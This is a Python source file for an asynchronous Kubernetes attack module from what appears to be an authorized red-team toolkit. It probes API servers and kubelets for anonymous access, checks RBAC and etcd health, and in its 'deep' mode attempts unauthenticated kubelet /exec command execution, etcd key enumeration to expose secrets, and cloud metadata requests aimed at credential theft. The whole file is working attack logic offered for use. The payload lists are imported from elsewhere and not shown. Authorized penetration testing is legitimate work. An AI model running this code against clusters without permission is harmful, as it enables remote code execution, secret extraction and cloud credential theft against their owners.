"""
Kubernetes cluster attacker module for authorized red-team engagements.

THIS MODULE PERFORMS ACTIVE ATTACKS AGAINST KUBERNETES CLUSTER COMPONENTS.
It must ONLY be used against clusters for which you have EXPLICIT WRITTEN
AUTHORIZATION. Unauthorized use may violate the Computer Fraud and Abuse Act,
the Computer Misuse Act, and equivalent laws worldwide.

Usage:
    attacker = K8sAttacker(authorized=True)
    report = await attacker.attack("192.168.1.100", mode="safe")
"""

from __future__ import annotations

import json
import logging
import time
from datetime import datetime, timezone
from typing import Any
from urllib.parse import urljoin

import httpx

from ..exceptions import AuthorizationRequired

from ._base import BaseAttacker
from ..models.k8s_result import (
    K8sAttackReport,
    K8sAttackResult,
    K8sComponent,
    K8sScanResult,
    K8sVulnSeverity,
)
from ..utils.k8s_payloads import (
    APISERVER_ANON_READ_PAYLOADS,
    CLOUD_METADATA_URLS,
    ETCD_KEY_PAYLOADS,
    K8S_DEFAULT_SCAN_PORTS,
    KUBELET_EXEC_PAYLOADS,
    RBAC_PROBE_PAYLOADS,
)

# Ports that use TLS — mirrors the constant defined in k8s_scanner
_TLS_PORTS: frozenset[int] = frozenset({6443, 443, 10250, 10259, 10257, 2380, 8443})


from ..utils.constants import USER_AGENT
logger = logging.getLogger(__name__)

_RESPONSE_BODY_CAP = 4096


class K8sAttacker(BaseAttacker):
    """
    Active attack module for Kubernetes cluster components.

    Requires authorized=True. Raises AuthorizationRequired otherwise.

    Safe mode:  Passive read probes — anonymous API reads, kubelet /pods,
                RBAC review, etcd health. No destructive operations.
    Deep mode:  Full suite — kubelet /exec command execution, Secret extraction,
                etcd key dump, cloud metadata SSRF (K08).
    """

    _MODULE_NAME = "KUBERNETES"

    def __init__(self, authorized: bool = False, judge: Any | None = None) -> None:
        super().__init__(authorized=authorized, judge=judge)

    async def attack(
        self,
        target: str,
        ports: list[int] | None = None,
        mode: str = "safe",
        headers: dict[str, str] | None = None,
        timeout: float = 15.0,
        scan_result: K8sScanResult | None = None,
    ) -> K8sAttackReport:
        """
        Execute attack sequences against Kubernetes cluster components.

        Args:
            target:       Hostname or IP of the cluster control plane / node.
            ports:        Ports to target. Defaults to K8S_DEFAULT_SCAN_PORTS.
            mode:         "safe" (anon reads + RBAC probes) or
                          "deep" (adds kubelet exec, secret extraction,
                                  etcd dump, cloud metadata SSRF).
            headers:      Extra HTTP headers.
            timeout:      Per-request timeout in seconds.
            scan_result:  Optional prior K8sScanResult to guide attack selection.

        Returns:
            K8sAttackReport with all attack results.
        """
        ports = ports or K8S_DEFAULT_SCAN_PORTS
        start = time.monotonic()
        report = K8sAttackReport(
            target=target,
            authorized=True,
            mode=mode,
            scan_result=scan_result,
        )

        extra_headers = {
            "User-Agent": f"{USER_AGENT} (authorized red-team)",
            **(headers or {}),
        }

        async with httpx.AsyncClient(
            headers=extra_headers,
            timeout=httpx.Timeout(timeout),
            follow_redirects=True,
            verify=False,  # noqa: S501 — intentional for security scanning
            trust_env=False,
        ) as client:
            # --- Safe mode attacks (run always) ---

            # Anon API server read probes (K03, K09)
            # 8001 = kubectl proxy (plain HTTP), 8080 = legacy insecure port
            apiserver_ports = [p for p in ports if p in (6443, 443, 8080, 8001)]
            for port in apiserver_ports:
                scheme = "https" if port in _TLS_PORTS else "http"
                base = f"{scheme}://{target}:{port}"
                api_results = await self._attack_apiserver_anon(client, base)
                report.attack_results.extend(api_results)

                # RBAC probe via SelfSubjectAccessReview (K02)
                rbac_results = await self._attack_rbac_probe(client, base)
                report.attack_results.extend(rbac_results)

            # Kubelet /pods read probe (K06, K09)
            kubelet_ports = [p for p in ports if p in (10250, 10255)]
            for port in kubelet_ports:
                scheme = "https" if port in _TLS_PORTS else "http"
                base = f"{scheme}://{target}:{port}"
                kubelet_read = await self._attack_kubelet_read(client, base, port)
                report.attack_results.extend(kubelet_read)

            # etcd health check (K06)
            etcd_ports = [p for p in ports if p in (2379, 2380)]
            for port in etcd_ports:
                base = f"http://{target}:{port}"
                etcd_health = await self._attack_etcd_health(client, base)
                report.attack_results.extend(etcd_health)

            if mode == "deep":
                # Kubelet /exec — RCE probe (K06, K09)
                for port in kubelet_ports:
                    if port == 10250:
                        scheme = "https"
                        base = f"{scheme}://{target}:{port}"
                        pods = await self._get_pod_list(client, base)
                        if pods:
                            exec_results = await self._attack_kubelet_exec(
                                client, base, pods[0]
                            )
                            report.attack_results.extend(exec_results)

                # etcd key dump (K03)
                for port in etcd_ports:
                    if port == 2379:
                        base = f"http://{target}:{port}"
                        etcd_dump = await self._attack_etcd_keys(client, base)
                        report.attack_results.extend(etcd_dump)

                # Cloud metadata SSRF (K08)
                meta_results = await self._attack_cloud_metadata(client)
                report.attack_results.extend(meta_results)

            # Optional: LLM attack-path narrative
            if self._judge and getattr(self._judge, "provider", None):
                self._enrich_with_llm(report)

        report.attack_duration = time.monotonic() - start
        report.attacked_at = datetime.now(timezone.utc)
        return report

    # ------------------------------------------------------------------
    # Attack: Anonymous API server reads
    # ------------------------------------------------------------------

    async def _attack_apiserver_anon(
        self, client: httpx.AsyncClient, base: str
    ) -> list[K8sAttackResult]:
        results: list[K8sAttackResult] = []
        for payload in APISERVER_ANON_READ_PAYLOADS:
            url = f"{base}{payload['path']}"
            result = K8sAttackResult(
                attack_id=payload["id"],
                owasp_id=payload["owasp_id"],
                description=payload["description"],
                severity=K8sVulnSeverity(payload["severity"]),
                payload_sent=f"GET {url}",
            )
            try:
                resp = await client.get(url)
                body_text = self._read_body(resp)
                result.response_snippet = body_text[:500]

                if resp.status_code == 200:
                    lower = body_text.lower()
                    for indicator in payload["detect_in_response"]:
                        if indicator.lower() in lower:
                            result.succeeded = True
                            result.evidence = (
                                f"HTTP 200 on {payload['path']}: "
                                f"indicator '{indicator}' found without authentication."
                            )
                            break
                    if not result.succeeded:
                        # Still succeeded — 200 without auth is the finding
                        result.succeeded = True
                        result.evidence = (
                            f"HTTP 200 on {payload['path']} without authentication."
                        )
            except httpx.RequestError as exc:
                result.error = str(exc)
            results.append(result)
        return results

    # ------------------------------------------------------------------
    # Attack: RBAC probe via SelfSubjectAccessReview
    # ------------------------------------------------------------------

    async def _attack_rbac_probe(
        self, client: httpx.AsyncClient, base: str
    ) -> list[K8sAttackResult]:
        results: list[K8sAttackResult] = []
        for payload in RBAC_PROBE_PAYLOADS:
            url = f"{base}{payload['path']}"
            result = K8sAttackResult(
                attack_id=payload["id"],
                owasp_id=payload["owasp_id"],
                description=payload["description"],
                severity=K8sVulnSeverity(payload["severity"]),
                payload_sent=f"POST {url}: {json.dumps(payload['body'])[:200]}",
            )
            try:
                resp = await client.post(
                    url,
                    json=payload["body"],
                    headers={"Content-Type": "application/json"},
                )
                body_text = self._read_body(resp)
                result.response_snippet = body_text[:500]

                if resp.status_code in (200, 201):
                    lower = body_text.lower()
                    for indicator in payload["detect_in_response"]:
                        if indicator.lower() in lower:
                            result.succeeded = True
                            result.evidence = (
                                f"HTTP {resp.status_code} SelfSubjectAccessReview: "
                                f"'{indicator}' in response — anonymous RBAC permissions confirmed."
                            )
                            break
            except httpx.RequestError as exc:
                result.error = str(exc)
            results.append(result)
        return results

    # ------------------------------------------------------------------
    # Attack: Kubelet read (/pods)
    # ------------------------------------------------------------------

    async def _attack_kubelet_read(
        self, client: httpx.AsyncClient, base: str, port: int
    ) -> list[K8sAttackResult]:
        results: list[K8sAttackResult] = []
        url = f"{base}/pods"
        result = K8sAttackResult(
            attack_id=f"K8S-ATK-KUBELET-PODS-{port}",
            owasp_id="K06",
            description=f"Unauthenticated kubelet /pods read on port {port}",
            severity=K8sVulnSeverity.HIGH if port == 10255 else K8sVulnSeverity.CRITICAL,
            payload_sent=f"GET {url}",
        )
        try:
            resp = await client.get(url)
            body_text = self._read_body(resp)
            result.response_snippet = body_text[:500]
            if resp.status_code == 200 and '"items"' in body_text:
                result.succeeded = True
                result.evidence = (
                    f"HTTP 200 on {url}: pod list returned without authentication."
                )
        except httpx.RequestError as exc:
            result.error = str(exc)
        results.append(result)
        return results

    # ------------------------------------------------------------------
    # Attack: etcd health
    # ------------------------------------------------------------------

    async def _attack_etcd_health(
        self, client: httpx.AsyncClient, base: str
    ) -> list[K8sAttackResult]:
        results: list[K8sAttackResult] = []
        url = f"{base}/health"
        result = K8sAttackResult(
            attack_id="K8S-ATK-ETCD-HEALTH",
            owasp_id="K06",
            description="Unauthenticated etcd /health endpoint access",
            severity=K8sVulnSeverity.HIGH,
            payload_sent=f"GET {url}",
        )
        try:
            resp = await client.get(url)
            body_text = self._read_body(resp)
            result.response_snippet = body_text[:200]
            if resp.status_code == 200 and "health" in body_text.lower():
                result.succeeded = True
                result.evidence = f"HTTP 200 on {url}: etcd is reachable without client auth."
        except httpx.RequestError as exc:
            result.error = str(exc)
        results.append(result)
        return results

    # ------------------------------------------------------------------
    # Attack: Kubelet /exec (deep mode, K06/K09)
    # ------------------------------------------------------------------

    async def _get_pod_list(
        self, client: httpx.AsyncClient, base: str
    ) -> list[dict[str, Any]]:
        """Return list of pod dicts from kubelet /pods."""
        try:
            resp = await client.get(f"{base}/pods")
            raw = resp.content[:_RESPONSE_BODY_CAP * 16]
            body = json.loads(raw)
            return body.get("items", [])
        except Exception:  # noqa: BLE001
            return []

    async def _attack_kubelet_exec(
        self,
        client: httpx.AsyncClient,
        base: str,
        pod: dict[str, Any],
    ) -> list[K8sAttackResult]:
        """Attempt kubelet /exec on the first available container in the pod."""
        results: list[K8sAttackResult] = []
        meta = pod.get("metadata", {})
        pod_name = meta.get("name", "")
        namespace = meta.get("namespace", "default")
        containers = pod.get("spec", {}).get("containers", [])
        if not pod_name or not containers:
            return results
        container = containers[0].get("name", "")

        for payload in KUBELET_EXEC_PAYLOADS:
            # URL pattern: /exec/{namespace}/{pod}/{container}?command=...&input=1&output=1&tty=0
            cmd = payload["command"]
            path = (
                f"/exec/{namespace}/{pod_name}/{container}"
                f"?command={cmd}&input=0&output=1&tty=0"
            )
            url = f"{base}{path}"
            result = K8sAttackResult(
                attack_id=payload["id"],
                owasp_id=payload["owasp_id"],
                description=payload["description"],
                severity=K8sVulnSeverity(payload["severity"]),
                payload_sent=f"GET {url}",
            )
            try:
                resp = await client.get(url)
                body_text = self._read_body(resp)
                result.response_snippet = body_text[:400]

                if resp.status_code in (200, 101):
                    lower = body_text.lower()
                    for indicator in payload["detect_in_response"]:
                        if indicator.lower() in lower:
                            result.succeeded = True
                            result.evidence = (
                                f"Kubelet /exec on {namespace}/{pod_name}/{container} "
                                f"returned '{indicator}' — unauthenticated RCE confirmed."
                            )
                            break
                    if not result.succeeded and resp.status_code == 200:
                        result.succeeded = True
                        result.evidence = (
                            f"Kubelet /exec on {namespace}/{pod_name}/{container} "
                            "returned HTTP 200 without authentication."
                        )
            except httpx.RequestError as exc:
                result.error = str(exc)
            results.append(result)
        return results

    # ------------------------------------------------------------------
    # Attack: etcd key dump (deep mode, K03)
    # ------------------------------------------------------------------

    async def _attack_etcd_keys(
        self, client: httpx.AsyncClient, base: str
    ) -> list[K8sAttackResult]:
        results: list[K8sAttackResult] = []
        for payload in ETCD_KEY_PAYLOADS:
            url = f"{base}{payload['path']}"
            result = K8sAttackResult(
                attack_id=payload["id"],
                owasp_id=payload["owasp_id"],
                description=payload["description"],
                severity=K8sVulnSeverity(payload["severity"]),
                payload_sent=f"GET {url}",
            )
            try:
                resp = await client.get(url)
                body_text = self._read_body(resp)
                result.response_snippet = body_text[:500]
                if resp.status_code == 200:
                    lower = body_text.lower()
                    for indicator in payload["detect_in_response"]:
                        if indicator.lower() in lower:
                            result.succeeded = True
                            result.evidence = (
                                f"Unauthenticated etcd key enumeration at {url}: "
                                f"indicator '{indicator}' found. Secrets may be extractable."
                            )
                            break
            except httpx.RequestError as exc:
                result.error = str(exc)
            results.append(result)
        return results

    # ------------------------------------------------------------------
    # Attack: Cloud metadata SSRF (deep mode, K08)
    # ------------------------------------------------------------------

    async def _attack_cloud_metadata(
        self, client: httpx.AsyncClient
    ) -> list[K8sAttackResult]:
        """
        Probe cloud instance metadata endpoints directly from the scanner host.
        In a real engagement this would run inside a compromised pod; here we
        probe from the external scanner to determine reachability from the
        cluster's network position.
        """
        results: list[K8sAttackResult] = []
        for payload in CLOUD_METADATA_URLS:
            url = payload["url"]
            extra_h = payload.get("detect_headers", {})
            result = K8sAttackResult(
                attack_id=payload["id"],
                owasp_id=payload["owasp_id"],
                description=payload["description"],
                severity=K8sVulnSeverity(payload["severity"]),
                payload_sent=f"GET {url}",
            )
            try:
                resp = await client.get(url, headers=extra_h)
                body_text = self._read_body(resp)
                result.response_snippet = body_text[:400]
                if resp.status_code == 200:
                    lower = body_text.lower()
                    for indicator in payload["detect_in_response"]:
                        if indicator.lower() in lower:
                            result.succeeded = True
                            result.evidence = (
                                f"Cloud IMDS reachable at {url}: "
                                f"'{indicator}' in response. "
                                "Pods can likely reach IMDS for credential theft."
                            )
                            break
            except httpx.RequestError as exc:
                result.error = str(exc)
            results.append(result)
        return results

    # ------------------------------------------------------------------
    # LLM enrichment
    # ------------------------------------------------------------------

    def _enrich_with_llm(self, report: K8sAttackReport) -> None:
        """
        Use LLM judge to build an attack-path narrative for succeeded attacks.
        Writes a combined reasoning note to the top result evidence.
        """
        if not self._judge:
            return
        succeeded = report.successful_attacks
        if not succeeded:
            return
        try:
            summary = "; ".join(f"{r.attack_id}:{r.description}" for r in succeeded[:5])
            verdict = self._judge.evaluate(
                category="K8s attack-path",
                probe=summary,
                response=f"{len(succeeded)} attack(s) succeeded",
            )
            reason = verdict.get("reason", "")
            if reason:
                succeeded[0].evidence += f" [LLM analysis: {reason}]"
        except Exception as exc:  # noqa: BLE001
            logger.debug("LLM enrichment error: %s", exc)

    # ------------------------------------------------------------------
    # Helper
    # ------------------------------------------------------------------

    @staticmethod
    def _read_body(resp: httpx.Response) -> str:
        """Read and decode response body safely, capped at _RESPONSE_BODY_CAP bytes."""
        try:
            raw = resp.content[:_RESPONSE_BODY_CAP]
            try:
                body = json.loads(raw)
                return json.dumps(body)
            except Exception:  # noqa: BLE001
                return raw.decode("utf-8", errors="replace")
        except Exception:  # noqa: BLE001
            return ""
